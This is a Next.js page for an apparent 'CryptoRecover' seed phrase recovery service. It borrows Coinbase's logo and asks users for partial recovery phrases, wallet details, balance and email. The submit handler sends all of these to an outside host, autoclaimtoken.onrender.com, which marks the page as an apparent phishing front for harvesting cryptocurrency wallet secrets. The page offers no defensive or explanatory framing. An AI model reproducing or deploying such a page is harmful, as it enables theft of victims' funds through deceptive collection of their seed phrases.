import { useState } from 'react';
import Head from 'next/head';
import Link from 'next/link';

export default function PhraseRecovery() {
  const [formData, setFormData] = useState({
    partialPhrase: '',
    walletHints: '',
    lastKnownBalance: '',
    recoveryMethod: 'Standard',
    walletType: 'MetaMask',
    contactEmail: ''
  });
  const [result, setResult] = useState(null);
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    
    try {
      const response = await fetch('https://autoclaimtoken.onrender.com/api/recover-wallet-phrase', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData)
      });
      
      const data = await response.json();
      setResult(data);
    } catch (error) {
      setResult({ success: false, message: 'Recovery service temporarily unavailable' });
    }
    
    setLoading(false);
  };

  return (
    <>
      <Head>
        <title>Phrase Recovery - CryptoRecover</title>
        <meta name="description" content="Professional seed phrase recovery service. Recover lost wallet access with partial phrases and wallet hints." />
      </Head>
      
      <div className="min-h-screen bg-gray-50">
        <header className="bg-white shadow-lg border-b border-gray-200">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex justify-between items-center py-4">
              <Link href="/" className="flex items-center space-x-4">
                <div className="w-10 h-10 rounded-xl overflow-hidden shadow-lg">
                  <img src="https://logo.clearbit.com/coinbase.com" alt="CryptoRecover" className="w-full h-full object-cover" />
                </div>
                <div>
                  <h1 className="text-2xl font-black text-gray-900">CryptoRecover</h1>
                  <p className="text-xs text-gray-500 font-medium">Phrase Recovery Service</p>
                </div>
              </Link>
              
              <Link href="/" className="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition-colors">
                ← Back to Scanner
              </Link>
            </div>
          </div>
        </header>

        <main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
          <div className="bg-white rounded-2xl shadow-xl p-8">
            <div className="text-center mb-8">
              <h2 className="text-4xl font-black text-gray-900 mb-4">Seed Phrase Recovery</h2>
              <p className="text-xl text-gray-600">Professional BIP39 phrase reconstruction service</p>
              <div className="flex justify-center space-x-4 mt-4">
                <div className="bg-green-100 px-4 py-2 rounded-lg">
                  <span className="text-green-800 font-bold">73% Success Rate</span>
                </div>
                <div className="bg-blue-100 px-4 py-2 rounded-lg">
                  <span className="text-blue-800 font-bold">25% Fee on Success</span>
                </div>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <label className="block text-sm font-bold text-gray-700 mb-2">
                  Partial Seed Phrase (Known Words)
                </label>
                <textarea
                  value={formData.partialPhrase}
                  onChange={(e) => setFormData({...formData, partialPhrase: e.target.value})}
                  placeholder="Enter any words you remember from your seed phrase..."
                  className="w-full p-4 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  rows="3"
                  required
                />
                <p className="text-sm text-gray-500 mt-1">
                  Enter any words you remember, even if not in order
                </p>
              </div>

              <div className="grid md:grid-cols-2 gap-6">
                <div>
                  <label className="block text-sm font-bold text-gray-700 mb-2">
                    Wallet Type
                  </label>
                  <select
                    value={formData.walletType}
                    onChange={(e) => setFormData({...formData, walletType: e.target.value})}
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500"
                  >
                    <option value="MetaMask">MetaMask</option>
                    <option value="Trust Wallet">Trust Wallet</option>
                    <option value="Coinbase Wallet">Coinbase Wallet</option>
                    <option value="Exodus">Exodus</option>
                    <option value="Electrum">Electrum</option>
                    <option value="Other">Other</option>
                  </select>
                </div>

                <div>
                  <label className="block text-sm font-bold text-gray-700 mb-2">
                    Recovery Method
                  </label>
                  <select
                    value={formData.recoveryMethod}
                    onChange={(e) => setFormData({...formData, recoveryMethod: e.target.value})}
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500"
                  >
                    <option value="Standard">Standard Recovery</option>
                    <option value="Advanced">Advanced Algorithms</option>
                    <option value="Brute Force">Brute Force (Premium)</option>
                  </select>
                </div>
              </div>

              <div>
                <label className="block text-sm font-bold text-gray-700 mb-2">
                  Wallet Creation Hints
                </label>
                <textarea
                  value={formData.walletHints}
                  onChange={(e) => setFormData({...formData, walletHints: e.target.value})}
                  placeholder="When was it created? What device? Any other details..."
                  className="w-full p-4 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500"
                  rows="2"
                />
              </div>

              <div>
                <label className="block text-sm font-bold text-gray-700 mb-2">
                  Last Known Balance (USD)
                </label>
                <input
                  type="number"
                  value={formData.lastKnownBalance}
                  onChange={(e) => setFormData({...formData, lastKnownBalance: e.target.value})}
                  placeholder="Approximate wallet value"
                  className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500"
                />
              </div>

              <div>
                <label className="block text-sm font-bold text-gray-700 mb-2">
                  Contact Email
                </label>
                <input
                  type="email"
                  value={formData.contactEmail}
                  onChange={(e) => setFormData({...formData, contactEmail: e.target.value})}
                  placeholder="your@email.com"
                  className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500"
                  required
                />
              </div>

              <button
                type="submit"
                disabled={loading}
                className="w-full bg-gradient-to-r from-blue-600 to-purple-600 text-white font-bold py-4 px-8 rounded-lg hover:from-blue-700 hover:to-purple-700 transition-all disabled:opacity-50"
              >
                {loading ? 'Analyzing Phrase...' : 'Start Recovery Analysis'}
              </button>
            </form>

            {result && (
              <div className={`mt-8 p-6 rounded-lg ${result.success ? 'bg-green-50 border border-green-200' : 'bg-red-50 border border-red-200'}`}>
                <h3 className={`text-lg font-bold mb-2 ${result.success ? 'text-green-800' : 'text-red-800'}`}>
                  Recovery Analysis Result
                </h3>
                <p className={`mb-4 ${result.success ? 'text-green-700' : 'text-red-700'}`}>
                  {result.message}
                </p>
                
                {result.analysis && (
                  <div className="bg-white p-4 rounded-lg">
                    <h4 className="font-bold text-gray-800 mb-2">Analysis Details:</h4>
                    <ul className="space-y-1 text-sm text-gray-600">
                      <li>• Valid Words: {result.analysis.validWords}/{result.analysis.phraseLength}</li>
                      <li>• Missing Words: {result.analysis.missingWords}</li>
                      <li>• Success Probability: {result.analysis.probability}%</li>
                      <li>• Recovery Strategies: {result.analysis.strategies}</li>
                    </ul>
                  </div>
                )}
              </div>
            )}
          </div>

          <div className="mt-8 bg-blue-50 border border-blue-200 rounded-xl p-6">
            <h3 className="text-lg font-bold text-blue-800 mb-2">How Phrase Recovery Works</h3>
            <div className="grid md:grid-cols-3 gap-4 text-sm text-blue-700">
              <div>
                <h4 className="font-semibold mb-1">1. Analysis</h4>
                <p>We analyze your partial phrase using BIP39 wordlist validation</p>
              </div>
              <div>
                <h4 className="font-semibold mb-1">2. Reconstruction</h4>
                <p>Advanced algorithms attempt to reconstruct missing words</p>
              </div>
              <div>
                <h4 className="font-semibold mb-1">3. Verification</h4>
                <p>Test reconstructed phrases against blockchain data</p>
              </div>
            </div>
          </div>
        </main>
      </div>
    </>
  );
}